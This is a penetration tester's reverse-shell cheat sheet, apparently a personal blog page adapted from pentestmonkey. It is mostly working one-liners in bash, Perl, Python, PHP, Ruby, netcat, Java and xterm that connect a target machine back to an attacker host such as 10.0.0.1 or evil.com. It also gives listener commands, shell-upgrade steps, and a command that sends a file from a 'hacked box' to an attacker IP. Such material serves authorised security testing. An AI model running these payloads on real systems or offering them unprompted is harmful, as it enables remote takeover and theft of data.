---
layout: memory
title: Benji's reverse shell cheat sheet
---

<p align="center">
<img width="600" src="/images/reverse-shell.png">
</p>

## Listener for a Reverse Shell

First at all start a listener on your machine

```bash
nc -lvnp <PORT e.g. 9001, 8080>
```

## Dropping a Reverse Shell

Source: [https://pentestmonkey.net/](https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet)

### Bash

Some versions of [bash can send you a reverse shell](http://www.gnucitizen.org/blog/reverse-shell-with-bash/) (this was tested on Ubuntu 10.10):

```bash
bash -i >& /dev/tcp/10.0.0.1/8080 0>&1
```

Alternatives for Bash shell:

```bash
exec /bin/bash 0&0 2>&0
```

Or:

```bash
0<&196;exec 196<>/dev/tcp/attackerip/4444; sh <&196 >&196 2>&196
```

Or:

```bash
exec 5<>/dev/tcp/attackerip/4444
cat <&5 | while read line; do $line 2>&5 >&5; done  # or:
while read line 0<&5; do $line 2>&5 >&5; done
```

Variant without usage of additional tools:

```bash
# Run on your machine
nc -l -p 8080 -vvv

# Run on target machine
exec 5<>/dev/tcp/evil.com/8080
cat <&5 | while read line; do $line 2>&5 >&5; done
```

 This technique comes handy in many situations and it leaves very small footprint on the targeted system.

Source: [gnucitizen.org](https://www.gnucitizen.org/blog/reverse-shell-with-bash/)

### PERL

Here’s a shorter, feature-free version of the [perl-reverse-shell](http://pentestmonkey.net/tools/web-shells/perl-reverse-shell):

```perl
perl -e 'use Socket;$i="10.0.0.1";$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
```

There’s also an [alternative PERL revere shell here](http://www.plenz.com/reverseshell).

### Python

This was tested under Linux / Python 2.7:

```python
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

### PHP

This code assumes that the TCP connection uses file descriptor 3.  This worked on my test system.  If it doesn’t work, try 4, 5, 6…

```php
php -r '$sock=fsockopen("10.0.0.1",1234);exec("/bin/sh -i <&3 >&3 2>&3");'
```

If you want a .php file to upload, see the more fateful and robust [php-reverse-shell](http://pentestmonkey.net/tools/web-shells/php-reverse-shell).

### Ruby

```ruby
ruby -rsocket -e'f=TCPSocket.open("10.0.0.1",1234).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
```

### Netcat

Netcat is rarely present on production systems and even if it is there are several version of netcat, some of which don’t support the -e option.

```bash
nc -e /bin/sh 10.0.0.1 1234
```

If you have the wrong version of netcat installed, [Jeff Price points out here](http://www.gnucitizen.org/blog/reverse-shell-with-bash/#comment-127498) that you might still be able to get your reverse shell back like this:

```bash
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 1234 >/tmp/f
```

### Java

```java
r = Runtime.getRuntime()
p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/10.0.0.1/2002;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
p.waitFor()
```

[Untested submission from anonymous reader]

### xterm

One of the simplest forms of reverse shell is an xterm session.  The following command should be run on the server.  It will try to connect back to you (10.0.0.1) on TCP port 6001.

```bash
xterm -display 10.0.0.1:1
```

To catch the incoming xterm, start an X-Server (:1 – which listens on TCP port 6001).  One way to do this is with Xnest (to be run on your system):

```bash
Xnest :1
```

You’ll need to authorise the target to connect to you (command also run on your host):

```bash
xhost +targetip
```

#### Further Reading

Also check out [Bernardo’s Reverse Shell One-Liners](http://bernardodamele.blogspot.com/2011/09/reverse-shells-one-liners.html).  He has some alternative approaches and doesn’t rely on /bin/sh for his Ruby reverse shell.

There’s a [reverse shell written in gawk over here](http://www.gnucitizen.org/blog/reverse-shell-with-bash/#comment-122387).  Gawk is not something that I’ve ever used myself.  However, it seems to get installed by default quite often, so is exactly the sort of language pentester might want to use for reverse shells.

## Upgrading your Reverse Shell

`python -c'import pty; pty.spawn("/bin/bash")'`

Background Session with `ctrl + z`

`stty raw -echo`

`stty -a`

get row & col

`stty rows X columns Y`

Set rows and cols

Foreground Session again

`fg #jobnumber`

`export XTERM=xterm-color`

enable clear

## Send file from machine to listener

Hacked box/machine:

```bash
cat <FILE> > /dev/tcp/<ATTACKER_IP>/<ATTACKER_PORT>
```

Your machine:

```bash
ncat -lvnp <ATTACKER_PORT> > <FILE>
```
